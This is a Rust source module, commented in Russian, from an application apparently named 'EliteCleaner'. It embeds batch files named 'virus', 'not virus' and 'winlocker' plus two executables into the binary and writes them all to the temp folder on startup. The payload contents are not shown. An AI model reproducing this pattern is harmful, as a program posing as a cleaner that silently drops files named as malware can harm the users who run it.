//! Встроенные скрипты — компилируются в бинарник через include_bytes!
//! При запуске распаковываются во временную директорию.

use std::path::PathBuf;

/// Встроенные файлы скриптов
pub struct EmbeddedScripts;

// Встраиваем все скрипты в бинарник
static VIRUS_BAT: &[u8] = include_bytes!("../../scripts/вирус.bat");
static NOT_VIRUS_BAT: &[u8] = include_bytes!("../../scripts/не вирус.bat");
static WINLOCKER_BAT: &[u8] = include_bytes!("../../scripts/винлокер.bat");
static SIMULATE_EXE: &[u8] = include_bytes!("../../release/scripts/simulate.exe");
static FC1_EXE: &[u8] = include_bytes!("../../scripts/1fc.exe");

impl EmbeddedScripts {
    /// Возвращает путь к директории распакованных скриптов
    pub fn get_extract_dir() -> PathBuf {
        let temp = std::env::var("TEMP").unwrap_or_else(|_| std::env::temp_dir().to_string_lossy().to_string());
        PathBuf::from(temp).join("EliteCleaner").join("scripts")
    }

    /// Распаковывает все скрипты во временную директорию.
    /// Вызывается один раз при старте приложения.
    pub fn extract_all() -> Result<PathBuf, String> {
        let dir = Self::get_extract_dir();
        std::fs::create_dir_all(&dir)
            .map_err(|e| format!("Не удалось создать директорию скриптов: {}", e))?;

        let files: &[(&str, &[u8])] = &[
            ("вирус.bat",    VIRUS_BAT),
            ("не вирус.bat", NOT_VIRUS_BAT),
            ("винлокер.bat", WINLOCKER_BAT),
            ("simulate.exe", SIMULATE_EXE),
            ("1fc.exe",      FC1_EXE),
        ];

        for (name, data) in files {
            let path = dir.join(name);
            std::fs::write(&path, data)
                .map_err(|e| format!("Не удалось записать {}: {}", name, e))?;
        }

        Ok(dir)
    }
}
